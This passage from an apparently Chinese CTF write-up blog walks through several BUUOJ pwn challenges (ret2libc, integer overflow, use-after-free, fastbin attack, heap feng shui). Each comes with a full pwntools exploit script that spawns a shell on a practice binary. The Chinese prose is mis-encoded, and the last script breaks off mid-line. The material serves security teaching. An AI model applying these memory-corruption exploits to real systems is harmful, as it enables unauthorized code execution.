<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level4&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28914)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/FxEkX38erav47Ad.png" alt="image.png"></p>
<h2 id="0x022-jarvisoj-level3-x64-ret2csu-ret2libc"><a href="#0x022-jarvisoj-level3-x64-ret2csu-ret2libc" class="headerlink" title="0x022.jarvisoj_level3_x64 - ret2csu + ret2libc"></a>0x022.jarvisoj_level3_x64 - ret2csu + ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/wKnv9UQdNWiGAgq.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/zZDt4oywbmu2Rgp.png" alt="image.png"></p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>ä¸¤ä¸ªå°gadgetçš„åœ°å€å¦‚ä¸‹</p>
<p><img src="https://i.loli.net/2020/12/01/Uz1lFs8roh9uSye.png" alt="image.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level3_x64&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,26836)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">write_got = e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(write_plt) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/01/9YlXciZazB3WoQU.png" alt="image.png"></p>
<h2 id="0x023-bjdctf-2020-babystack2-integer-overflow-ret2text"><a href="#0x023-bjdctf-2020-babystack2-integer-overflow-ret2text" class="headerlink" title="0x023.bjdctf_2020_babystack2 - integer overflow + ret2text"></a>0x023.bjdctf_2020_babystack2 - integer overflow + ret2text</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/e2jUYcNvISPsZqy.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/j2BrJifVY48SbTK.png" alt="image.png"></p>
<p>readè¯»å…¥æ—¶ä¼šæŠŠsignedè½¬æˆunsignedï¼Œ è¾“å…¥-1å³å¯ç»•è¿‡æ£€æµ‹</p>
<p>åŒæ—¶æˆ‘ä»¬å‘ç°å­˜åœ¨åé—¨å‡½æ•°ï¼Œè¿”å›è‡³æ­¤å³å¯</p>
<p><img src="https://i.loli.net/2020/12/01/MHwmRf2q1tEk9ro.png" alt="image.png"></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;, 25058)</span></span><br><span class="line">backdoor = <span class="number">0x400726</span></span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>).encode())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/01/xLOq52VBcJ74bUm.png" alt="image.png"></p>
<h2 id="0x024-hitcontraining-uaf-UAF-fastbin-double-free"><a href="#0x024-hitcontraining-uaf-UAF-fastbin-double-free" class="headerlink" title="0x024.hitcontraining_uaf - UAF + fastbin double free"></a>0x024.hitcontraining_uaf - UAF + fastbin double free</h2><p><del>æ¼æ´ç›´æ¥åœ¨é¢˜ç›®åç§°é‡Œè¯´æ˜äº†äº‹UAF</del></p>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/03/xhMBIPmZ2V8RHyu.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªç¨‹åºæœ‰ç€<strong>åˆ†é…ã€æ‰“å°ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</strong></p>
<p>ä¸éš¾çœ‹å‡ºåœ¨æ·»åŠ å †å—æ—¶é¦–å…ˆä¼šåˆ†é…ä¸€ä¸ª8å­—èŠ‚å¤§å°çš„chunkï¼Œè¯¥chunkå‰4å­—èŠ‚å‚¨å­˜ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå4å­—èŠ‚åˆ™å‚¨å­˜å®é™…åˆ†é…çš„chunkçš„æŒ‡é’ˆ</p>
<p><img src="https://i.loli.net/2020/12/03/6Fg3EXu5rqiH9wQ.png" alt="image.png"></p>
<p>åœ¨æ‰“å°å †å—æ—¶ä¼šè°ƒç”¨å°chunkä¸­çš„å‡½æ•°æŒ‡é’ˆæ¥æ‰“å°å †å—å†…å®¹</p>
<p><img src="https://i.loli.net/2020/12/03/m2nw4WfoP8cGgsS.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨é‡Šæ”¾å †å—çš„è¿‡ç¨‹ä¸­å¹¶æœªå°†å †å—æŒ‡é’ˆç½®0ï¼Œ<strong>å­˜åœ¨UAFæ¼æ´</strong></p>
<p><img src="https://i.loli.net/2020/12/03/ZkwVJ34ifBMCytQ.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨åé—¨å‡½æ•°</p>
<p><img src="https://i.loli.net/2021/01/28/5LWOIwy4eD1XgjP.png"></p>
<p>æ•…è€ƒè™‘é€šè¿‡fastbin double freeåˆ†é…åˆ°åŒä¸€ä¸ªå †å—åå †é£æ°´æ”¹å†™å‡½æ•°æŒ‡é’ˆä¸ºåé—¨å‡½æ•°åœ°å€åæ‰“å°å³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./hacknote&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,28832)</span></span><br><span class="line">backdoor = <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Note size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">8</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">8</span>, p32(backdoor)) <span class="comment"># idx 2, overlapping</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/03/yKXTYzOgBD4HIPW.png" alt="image.png"></p>
<h2 id="0x025-ZJCTF-2019-EasyHeap-fastbin-attack"><a href="#0x025-ZJCTF-2019-EasyHeap-fastbin-attack" class="headerlink" title="0x025.[ZJCTF 2019]EasyHeap - fastbin attack"></a>0x025.[ZJCTF 2019]EasyHeap - fastbin attack</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/03/xyaWKuVEgNkX7rs.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥å‘ç°è¯¥ç¨‹åºå­˜åœ¨åˆ†é…ã€ç¼–è¾‘ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</p>
<p>æ¼æ´ç‚¹åœ¨äºç¼–è¾‘å †å—çš„åœ°æ–¹ï¼Œå¯ä»¥è¾“å…¥ä»»æ„é•¿åº¦å†…å®¹é€ æˆå †æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/12/03/wRoqFJ6Z5VXpLeM.png" alt="image.png"></p>
<p>åˆ©ç”¨è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥ä¿®æ”¹fastbinä¸­çš„fdåˆ†é…fake chunkæ¥è¿›è¡Œä»»æ„åœ°å€å†™</p>
<p>åœ¨bssæ®µé™„è¿‘æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªsizeåˆé€‚çš„åœ°æ–¹</p>
<p><img src="https://i.loli.net/2020/12/03/SjcMlvYBCKwhfp6.png" alt="image.png"></p>
<p>ç”±äºpltè¡¨ä¸­å°±æœ‰systemå‡½æ•°ï¼Œæ•…è€ƒè™‘åˆ†é…ä¸€ä¸ªbssæ®µä¸Šçš„fake chunkåä¿®æ”¹ä»»ä¸€å †å—æŒ‡é’ˆä¸º<code>free@got</code>åä¿®æ”¹<code>free@got</code>ä¸º<code>system@plt</code>åfreeæ‰ä¸€ä¸ªå†…å®¹ä¸º<code>&quot;/bin/sh\x00&quot;</code>çš„chunkå³å¯get shell</p>
<p><img src="https://i.loli.net/2020/12/03/w2WaI8uy7Sb1hsz.png" alt="image.png"></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26930</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x8048945</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap : &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020a0</span> - <span class="number">3</span> + <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">114514</span>, payload)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 5, fake chunk on the bss</span></span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">b&#x27;\xaa&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(e.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">    edit(<span class="number">5</span>, <span class="number">0x100</span>, payload2)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x10</span>, p64(e.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    </span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/03/R5qOZ8lECUYPbN6.png" alt="image.png"></p>
<blockquote>
<p>å…¶å®æœ‰ä¸€ä¸ªcat flagçš„åé—¨å‡½æ•°ï¼Œä¸è¿‡pwnçš„æœ€ç»ˆç›®çš„è‡ªç„¶æ˜¯getshellï¼Œ<del>æ‰€ä»¥è¿™ä¸ªåé—¨å‡½æ•°å¯¹ğŸ‘´æ¥è¯´ä¸å­˜åœ¨çš„</del></p>
</blockquote>
<h2 id="0x026-babyfengshui-33c3-2016-heap-arrangement-got-table-hijack"><a href="#0x026-babyfengshui-33c3-2016-heap-arrangement-got-table-hijack" class="headerlink" title="0x026.babyfengshui_33c3_2016 - heap arrangement + got table hijack"></a>0x026.babyfengshui_33c3_2016 - heap arrangement + got table hijack</h2><p><del>å †é¢˜é›†ä¸­åœ°å¸¦è¯·å°å¿ƒ</del></p>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/03/9dq2QrJkFpe1uwt.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/04/e1UhWOLn3pu7BXd.png" alt="image.png"></p>
<p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºåˆ†é…å †å—æ—¶æ‰€ç”Ÿæˆçš„å¤§è‡´ç»“æ„åº”å½“å¦‚ä¸‹ï¼Œä¸”<strong>è¯¥ç»“æ„ä½“mallocçš„å¤§å°ä¸º0x80ï¼Œå¤„åœ¨unsorted bin èŒƒå›´å†…</strong></p>
<p><img src="https://i.loli.net/2020/12/04/aucnheQl23Z8CbK.png" alt="image.png"></p>
<p>æ¼æ´ç‚¹åœ¨äºå¯¹è¾“å…¥é•¿åº¦çš„æ£€æµ‹ï¼Œå®ƒæ˜¯æ£€æµ‹çš„æ˜¯<strong>æˆ‘ä»¬æ‰€è¾“å…¥çš„é•¿åº¦æ˜¯å¦å¤§äºä»description chunkçš„addråˆ°struct chunkçš„prev_sizeçš„é•¿åº¦</strong></p>
<p><img src="https://i.loli.net/2020/12/04/6HFv8WPtpDZcbgN.png" alt="image.png"></p>
<p>åœ¨å¸¸è§„æƒ…å†µä¸‹æˆ‘ä»¬ä¼¼ä¹åªèƒ½å¤Ÿè¦†å†™æ‰PREV_SIZEçš„ä¸€éƒ¨åˆ†ï¼Œä¸ç—›ä¸ç—’</p>
<p>ä½†æ˜¯è€ƒè™‘è¿™æ ·çš„ä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬å…ˆåˆ†é…ä¸¤ä¸ªå¤§å—ï¼ˆchunk<em>4ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå—çš„sizeè¦åœ¨unsortedèŒƒå›´å†…ï¼‰ï¼Œä¹‹åé‡Šæ”¾æ‰ç¬¬ä¸€ä¸ªå¤§å—ï¼Œå†åˆ†é…ä¸€ä¸ªsizeæ›´å¤§çš„å—ï¼Œunsorted binå†…å°±ä¼šä»è¿™ä¸ªå¤§chunkï¼ˆç”±ä¸¤ä¸ªchunkåˆå¹¶è€Œæ¥ï¼‰ä¸­åˆ‡å‰²ä¸€ä¸ªå¤§chunkç»™åˆ°descriptionï¼Œä¹‹åå†ä»ä¸‹æ–¹çš„top chunkåˆ‡å‰²0x90æ¥ç»™åˆ°structï¼Œè¿™ä¸ªæ—¶å€™*<em>ç”±äºå¯¹lengthçš„é”™è¯¯åˆ¤å®šå°±ä¼šå¯¼è‡´æˆ‘ä»¬æœ‰æœºä¼šè¦†å†™ç¬¬äºŒä¸ªå¤§å—ä¸­çš„å†…å®¹</em></em></p>
<p><img src="https://i.loli.net/2020/12/04/uveEXY9RBpGIofU.png" alt="image.png"></p>
<p>æ•…è€ƒè™‘å…ˆè¦†å†™ç¬¬äºŒä¸ªå¤§å—ä¸­çš„description addrä¸ºfree@gotåæ³„æ¼å‡ºlibcçš„åŸºå€ï¼Œåå†ä¿®æ”¹free@gotä¸ºsystemå‡½æ•°åœ°å€åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸º<code>&quot;/bin/sh&quot;</code>çš„chunkå³å¯é€šè¿‡<code>system(&quot;/bin/sh&quot;)</code>æ¥get shell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,26486)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, name, length:<span 